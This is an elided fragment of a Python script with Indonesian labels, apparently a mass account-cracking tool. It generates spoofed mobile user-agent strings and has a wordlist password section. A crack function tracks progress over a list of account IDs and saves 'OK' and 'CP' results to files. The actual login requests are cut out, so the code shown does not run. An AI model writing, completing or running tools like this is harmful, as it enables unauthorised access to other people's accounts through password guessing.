...
for xd in range(10000):
	...
	f='vivo 1808 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
...
for x in range(10):
	...
	i='11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile/15A372 Safari/604.1'
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'└── {m}•{u}•{h}•{x} Sedang Meretas Satelit {m}•{u}•{h}•{x}  ')
	print('')
	print(f'└── Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
	print(f'└── Hasil {u}CP{x} Tersimpan Di : {u}CP/%s {x}'%(cpc))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r😎 {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{u}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
